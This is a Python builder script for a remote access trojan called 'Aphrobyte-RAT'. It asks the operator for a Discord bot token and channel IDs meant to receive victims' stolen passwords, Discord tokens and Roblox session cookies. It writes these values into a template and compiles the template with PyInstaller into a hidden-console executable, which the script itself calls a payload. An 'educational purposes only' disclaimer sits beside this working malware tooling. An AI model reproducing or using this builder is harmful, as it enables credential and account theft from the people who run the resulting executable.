import sys, os, shutil
try:
    from termcolor import colored
    import colorama
except:
    os.system("pip install termcolor")
    os.system("pip install colorama")
    from termcolor import colored
    import colorama

colorama.init()

####################################################

samplefile = ".buildmodules\sample.py"

class Builder:
    def __init__(self,token,guild_id,announc,passw,tokens,roblosec):
        self.token = token
        self.guild_id = guild_id
        self.announc = announc
        self.passw = passw
        self.tokens = tokens
        self.roblosec = roblosec

        f = open(".buildmodules\main.py", 'r')
        file = f.read()
        f.close()

        newfile = file.replace("{token}", self.token)
        newfile = newfile.replace("{guild_id}", self.guild_id)
        newfile = newfile.replace("{announc}", self.announc)
        newfile = newfile.replace("{passw}", self.passw)
        newfile = newfile.replace("{tokens}", self.tokens)
        newfile = newfile.replace("{roblosec}", self.roblosec)

        f = open(".buildmodules\main.py", 'w')
        f.write(newfile)
        f.close()
    def build(self):
        os.system("""
python -m PyInstaller --onefile --noconsole --name="Client-built" --icon=".buildmodules\exeic.ico" ".buildmodules\main.py"
""")


####################################################


def pause():
    os.system("pause")  
def clear():
    os.system("cls")    
ascii_art = """

░█████╗░██████╗░██╗░░██╗██████╗░░█████╗░██████╗░██╗░░░██╗████████╗███████╗
██╔══██╗██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝
███████║██████╔╝███████║██████╔╝██║░░██║██████╦╝░╚████╔╝░░░░██║░░░█████╗░░
██╔══██║██╔═══╝░██╔══██║██╔══██╗██║░░██║██╔══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░
██║░░██║██║░░░░░██║░░██║██║░░██║╚█████╔╝██████╦╝░░░██║░░░░░░██║░░░███████╗
╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝

This tool has been made for educational purposes only. I am not responsible for any misuse of this tool.
Made by RIOT Administration | v1.9.1
""" 
clear()
os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
""")
print(colored("""WARNING: Enable Developer Mode on Discord first. Look on YouTube if you don't know something.""", 'red'))
print(colored("""WARNING: Your Discord bot should have all privileged gateway intents enabled. If you don't know how to enable them, look on YouTube.""", 'red'))   
pause()
clear()
os.system("""title "Aphrobyte-RAT Builder | Configuration | Unlicensed"
""")
print(colored(ascii_art, 'white'))
print(colored("-"*75,'red'))
print("")   
token = input("Bot token : ")
guildid = input("Server ID : ")
annc = input("Notification channel ID : ")
passw = input("Passwords channel ID to receive passwords : ")
tokens = input("Tokens channel ID to receive tokens : ")
roblosecurity = input("Roblosecurity channel ID to receive Roblox cookies : ")  
print("")
clear()
print(colored(f"""
Bot token : {token}
Guild ID : {guildid}
Notifications channel ID : {annc}
Passwords channel ID : {passw}
Tokens channel ID : {tokens}
Roblosecurity channel ID : {roblosecurity}

""", 'green'))
prompt = input("Is this correct? (y/n)")
if prompt.lower() == "y":
    pass
elif prompt.lower() == "n":
    exit()
os.system("""title "Aphrobyte-RAT Builder | Compiling | Unlicensed"
""")
clear()
print(colored("Started compiling Aphrobyte-RAT configuration...", 'green'))
shutil.copy(samplefile, ".buildmodules\main.py")
builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
builder.build()
print("")
print(colored("""
Your payload has been successfully created. It has been named to "Client-built.exe" and can be used as a standalone.
""", 'green'))
shutil.copy("dist\Client-built.exe", "Client-built.exe")
os.remove(".buildmodules\main.py")
os.system("""title "Aphrobyte-RAT Builder | Built | Unlicensed"
""")
pause()